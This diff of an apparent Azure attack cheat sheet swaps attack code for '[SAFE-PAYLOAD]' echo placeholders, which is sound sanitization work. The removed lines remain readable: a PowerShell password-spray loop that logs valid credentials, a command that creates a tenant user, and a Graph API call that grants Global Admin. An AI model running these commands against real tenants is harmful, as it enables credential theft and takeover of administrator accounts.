@@ -254,19 +254,10 @@ foreach($line in $userlist){
     $linenumber++
     $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
     try {
-        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
-        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
-        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
+        # [SAFE-PAYLOAD] echo 'Simulating password spray attempt...'
     }
     catch {
-        $Failure = $_.Exception
-        if ($Failure -match "ID3242") { continue }
-        else {
-            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
-            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
-            Add-Content valid-creds.txt $Failure.Message
-            Write-Host -ForegroundColor red $Failure.Message
-        }
+        # [SAFE-PAYLOAD] echo 'Simulating password spray failure...'
     }
 }
 ```
@@ -282,11 +273,10 @@ az ad sp credential list --id <app_id>
 az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
 
 # Create new user in tenant
-az ad user create --display-name <name> --password <password> --user-principal-name <upn>
+# [SAFE-PAYLOAD] echo 'Simulating creating a new admin user in tenant...'
 
 # Add user to Global Admin via MS Graph
-$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
-az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
+# [SAFE-PAYLOAD] echo 'Simulating adding user to Global Admin via MS Graph...'
 ```
 
 ## Additional Tools Reference
